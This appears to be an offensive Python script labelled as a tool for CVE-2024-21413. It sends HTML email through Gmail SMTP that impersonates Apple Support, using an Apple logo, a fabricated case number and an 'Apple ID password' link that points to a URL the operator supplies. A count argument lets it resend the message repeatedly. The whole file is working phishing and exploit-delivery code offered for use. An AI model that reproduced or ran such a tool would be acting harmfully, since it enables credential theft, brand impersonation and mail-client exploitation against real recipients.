import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import argparse
from colorama import Fore, Style, init
import re  # For email validation

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header():
    print(f"{colors.HEADER}{colors.BOLD}{'='*90}")
    print(f"{colors.OKBLUE}{colors.BOLD}Email Sending Script CVE-2024-21413{colors.ENDC} Developed by https://github.com/ThemeHacker")
    print(f"{colors.HEADER}{'='*90}{colors.ENDC}")

def ascii_emailtools():
    print("")
    init(autoreset=True)
    art = [
        "███████╗███╗   ███╗ █████╗ ██╗██╗         ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "██╔════╝████╗ ████║██╔══██╗██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "█████╗  ██╔████╔██║███████║██║██║            ██║   ██║   ██║██║   ██║██║     ███████╗",
        "██╔══╝  ██║╚██╔╝██║██╔══██║██║██║            ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "███████╗██║ ╚═╝ ██║██║  ██║██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝"
    ]
    
    colors_list = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    
    for i, line in enumerate(art):
        print(colors_list[i % len(colors_list)] + line)

def is_valid_email(email):
    """Check if the provided email is valid."""
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email) is not None

def send_email(receiver_email, subject, link_content=None, email_number=1):
    sender_email = os.getenv('SENDER_EMAIL')
    sender_password = os.getenv('SENDER_PASSWORD')

    if not sender_email or not sender_password:
        print(f"{colors.FAIL}Error: Sender email and password must be set in environment variables.{colors.ENDC}")
        return

    if not is_valid_email(receiver_email):
        print(f"{colors.FAIL}Error: Invalid recipient email address: {receiver_email}.{colors.ENDC}")
        return

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Create HTML content
    html_content = f"""\
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{
                font-family: 'Helvetica', sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f4f4f4;
                color: #333333;
            }}
            .container {{
                max-width: 600px;
                margin: 20px auto;
                background-color: #ffffff;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
                text-align: left;
            }}
            .header {{
                margin-bottom: 20px;
                text-align: center;
            }}
            .header img {{
                max-width: 50px;
            }}
            h1 {{
                color: #2c3e50;
                font-size: 26px;
                margin-bottom: 15px;
            }}
            p {{
                color: #555555;
                font-size: 16px;
                line-height: 1.6;
                margin-bottom: 15px;
            }}
            .case-number {{
                font-weight: bold;
                color: #3498db;
                font-size: 18px;
            }}
            .link {{
                color: #3498db;
                text-decoration: none;
                font-weight: bold;
            }}
            footer {{
                margin-top: 30px;
                font-size: 14px;
                color: #777777;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
            </div>
            <h1>Thanks for contacting us.</h1>
            <p>Hi {receiver_email}</p>
            <p>If you need to reopen this case, click the link below.</p>
            <p class="case-number">Case: 100296573221</p>
            <p>Based on the details you provided, we think you might find the following information helpful:</p>
            <p><a href="{link_content}" class="link">If you forgot your Apple ID password</a></p>
            <p>We are here to help. At <a href="https://support.apple.com" class="link">Apple Support</a>, you can learn more about your product, download the latest software updates, and share tips and solutions with other users. You can also find out the best way to contact us.</p>
            <footer>
                <p>Thanks,<br>
                Apple Support<br>
                <a href="mailto:support@apple.com" class="link">support@apple.com</a> | (800) 555-0199</p>
            </footer>
        </div>
    </body>
    </html>
    """

    msg.attach(MIMEText(html_content, 'html'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print(f"{colors.OKGREEN}Email sent successfully {email_number} to {receiver_email}.{colors.ENDC}")
    except smtplib.SMTPAuthenticationError:
        print(f"{colors.FAIL}Authentication failed. Check your email and password.{colors.ENDC}")
    except smtplib.SMTPConnectError:
        print(f"{colors.FAIL}Could not connect to the SMTP server. Check your network settings.{colors.ENDC}")
    except Exception as e:
        print(f"{colors.FAIL}Failed to send email {email_number} to {receiver_email}: {e}{colors.ENDC}")

if __name__ == "__main__":
    os.system('clear')
    print_header()
    ascii_emailtools()

    parser = argparse.ArgumentParser(description='Send emails using Gmail SMTP.')
    parser.add_argument('--recipient', required=True, help='Recipient email address')
    parser.add_argument('--subject', required=True, help='Subject of the email')
    parser.add_argument('--link', required=False, help='Optional link to include in the email')
    parser.add_argument('--count', type=int, required=True, help='Number of times to send the email')

    args = parser.parse_args()

    for i in range(1, args.count + 1):
        send_email(args.recipient, args.subject, args.link, i)
